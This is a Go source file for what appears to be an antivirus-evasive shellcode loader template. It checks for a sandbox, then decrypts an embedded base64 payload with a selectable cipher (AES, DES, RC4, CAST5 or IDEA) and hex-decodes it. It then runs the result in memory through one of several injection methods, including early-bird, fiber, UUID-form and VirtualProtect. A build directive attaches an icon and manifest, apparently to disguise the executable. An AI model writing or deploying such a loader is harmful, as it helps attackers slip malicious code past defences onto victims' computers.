//go:generate goversioninfo -icon=resource/icon.ico -manifest=resource/alfred.manifest
package main

import (
	"upx/loader"
	"upx/sandbox"
	"encoding/hex"
	"github.com/deatil/go-cryptobin/cryptobin/crypto"
)

var (
	encode = EncodeDes

	key = ""

	source = ""

	call = CallRtl
)

const (
	EncodeAes   = "aes"
	EncodeDes   = "des"
	EncodeRc4   = "rc4"
	EncodeCast5 = "cast5"
	EncodeIDea  = "idea"

	CallEarly = "early"
	CallHeap  = "heap"
	CallFiber = "fiber"
	CallRtl   = "rtl"
	CallUuid  = "uuid"
	CallVirt  = "Virt"
)

func main() {
	codeStr := ""
	// check sandbox
	sandbox.CheckSandBox(true)
	// decode
	if encode == EncodeAes {
		codeStr = crypto.FromBase64String(source).SetKey(key).SetIv(key).Aes().CBC().PKCS7Padding().Decrypt().ToString()
	} else if encode == EncodeDes {
		codeStr = crypto.FromBase64String(source).SetKey(key).SetIv(key).Des().CBC().PKCS7Padding().Decrypt().ToString()
	} else if encode == EncodeRc4 {
		codeStr = crypto.FromBase64String(source).SetKey(key).SetIv(key).RC4().CBC().PKCS7Padding().Decrypt().ToString()
	} else if encode == EncodeCast5 {
		codeStr = crypto.FromBase64String(source).SetKey(key).SetIv(key).Cast5().CBC().PKCS7Padding().Decrypt().ToString()
	} else if encode == EncodeIDea {
		codeStr = crypto.FromBase64String(source).SetKey(key).SetIv(key).Idea().CBC().PKCS7Padding().Decrypt().ToString()
	} else {
		panic("encode type error")
	}
	// hex decode
	hexCode, _ := hex.DecodeString(codeStr)
	// call
	if call == CallEarly {
		loader.RunEar(hexCode)
	} else if call == CallHeap {
		loader.RunHeap(hexCode)
	} else if call == CallFiber {
		loader.RunFib(hexCode)
	} else if call == CallRtl {
		loader.RunRtl(hexCode)
	} else if call == CallUuid {
		loader.RunUuidForm(hexCode)
	} else if call == CallVirt {
		loader.RunVirProtect(hexCode)
	} else {
		panic("call type error")
	}
}
